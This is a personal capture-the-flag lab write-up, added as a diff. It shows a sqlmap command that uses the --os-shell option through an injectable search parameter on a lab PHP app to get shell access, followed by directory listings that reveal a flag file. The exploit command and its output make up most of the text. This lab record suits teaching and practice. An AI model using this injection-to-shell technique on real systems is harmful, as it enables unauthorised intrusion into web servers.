@@ -1,0 +1,151 @@
+This is a continuation of the flag de3b, once I have done the sql injection and 
+checked the files in the cuiter database. There were 5 databases and the flag de3b was
+in cuituer database.
+
+using sqlmap again, and more intrigiuing features of sqlmap
+
+so the new command for this is by using the os shell feature of sqlmap
+sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="recherche=&btnRechercher=Rechercher" --cookie="PHPSESSID=tv27194dltn7srq401bhf4r237" -p recherche --os-shell --batch
+this is the command that has given me shell access to the database
+
+and then once i had access to the database, i did ls to find all available stuff
+os-shell> ls
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output:
+---
+abonnements.php
+abonnes.php
+bibli_cuiteur.php
+bibli_generale.php
+blabla.php
+comparaison_requetes.txt
+compte.php
+cuiteur.php
+deconnexion.php
+inscription.php
+mentions.php
+recherche.php
+recherche_old.php
+suggestions.php
+tendances.php
+tmpbsyqu.php
+tmpubxzx.php
+tmpugnip.php
+utilisateur.php
+---
+os-shell> pwd
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output: '/var/www/html/php'
+os-shell> 
+
+
+and then i did the following command
+
+ls -la /var/www/html/
+
+to move out and see whats there as cd .. wasnt working
+
+and i saw more things are there, but it was throwing issues
+
+
+
+s-shell> find /var/www -type f 2>/dev/null
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output:
+---
+/var/www/html/index.php
+/var/www/html/styles/cuiteur__.css_
+/var/www/html/styles/cuiteur.css
+/var/www/html/styles/presentation.css
+/var/www/html/images/cherche.png
+/var/www/html/images/fond_info.png
+/var/www/html/images/speaker.png
+/var/www/html/images/entete.jpg
+/var/www/html/images/trombone_over.png
+/var/www/html/images/haut_parleur.png
+/var/www/html/images/trait.png
+/var/www/html/images/connecte.png
+/var/www/html/images/deconnecte.png
+/var/www/html/images/micro.jpg
+/var/www/html/images/bouton_over.png
+/var/www/html/images/anonyme.jpg
+/var/www/html/images/cherche_over.png
+/var/www/html/images/trombone.png
+/var/www/html/images/config.png
+/var/www/html/images/bouton.png
+/var/www/html/images/entete_deconnecte.jpg
+/var/www/html/images/home.png
+/var/www/html/images/photos/telephone3.jpg
+/var/www/html/images/photos/serveur1.jpg
+/var/www/html/images/photos/bd2_grande.jpg
+/var/www/html/images/photos/bd1.jpg
+/var/www/html/images/photos/megaphone.jpg
+/var/www/html/images/photos/serveur2_grande.jpg
+/var/www/html/images/photos/serveur3_grande.jpg
+/var/www/html/images/photos/radio.jpg
+/var/www/html/images/photos/cuiteurophone.png
+/var/www/html/images/photos/mail.jpg
+/var/www/html/images/photos/bd2.jpg
+/var/www/html/images/photos/mail_grande.jpg
+/var/www/html/images/photos/serveur4_grande.jpg
+/var/www/html/images/photos/serveur3.jpg
+/var/www/html/images/photos/bd1_grande.jpg
+/var/www/html/images/photos/telephone1.jpg
+/var/www/html/images/photos/moustique.jpg
+/var/www/html/images/photos/securite.jpg
+/var/www/html/images/photos/serveur1_grande.jpg
+/var/www/html/images/photos/dactylo.jpg
+/var/www/html/images/photos/cuiteur.png
+/var/www/html/images/photos/telephone4.jpg
+/var/www/html/images/photos/serveur4.jpg
+/var/www/html/images/photos/serveur2.jpg
+/var/www/html/images/photos/clavier.jpg
+/var/www/html/images/home_over.png
+/var/www/html/images/config_over.png
+/var/www/html/images/saisie.png
+/var/www/html/images/fond_blabla.png
+/var/www/html/images/fond.jpg
+/var/www/html/images/favicon.ico
+/var/www/html/images/haut_parleur_over.png
+/var/www/html/images/pied.png
+/var/www/html/upload/4.jpg
+/var/www/html/upload/24.jpg
+/var/www/html/upload/7.jpg
+/var/www/html/upload/25.jpg
+/var/www/html/upload/6.jpg
+/var/www/html/upload/5.jpg
+/var/www/html/upload/22.jpg
+/var/www/html/upload/27.jpg
+/var/www/html/upload/1.jpg
+/var/www/html/upload/3.jpg
+/var/www/html/upload/26.jpg
+/var/www/html/upload/2.jpg
+/var/www/html/upload/23.jpg
+/var/www/html/php/comparaison_requetes.txt
+/var/www/html/php/abonnements.php
+/var/www/html/php/tmpbsyqu.php
+/var/www/html/php/mentions.php
+/var/www/html/php/abonnes.php
+/var/www/html/php/utilisateur.php
+/var/www/html/php/bibli_cuiteur.php
+/var/www/html/php/suggestions.php
+/var/www/html/php/recherche.php
+/var/www/html/php/tmpubxzx.php
+/var/www/html/php/blabla.php
+/var/www/html/php/tendances.php
+/var/www/html/php/cuiteur.php
+/var/www/html/php/deconnexion.php
+/var/www/html/php/tmpugnip.php
+/var/www/html/php/recherche_old.php
+/var/www/html/php/inscription.php
+/var/www/html/php/bibli_generale.php
+/var/www/html/php/compte.php
+/var/www/html/flag{3b20008aaca41a229f98fa8a0221022dac636b0295477b}.jpg
+/var/www/html/html/moyens.html
+/var/www/html/html/presentation.html
+/var/www/html/index.html
+---
+
+
+and then after doing that command, i got the flag 3b2000 and then i copied it onto
+my device
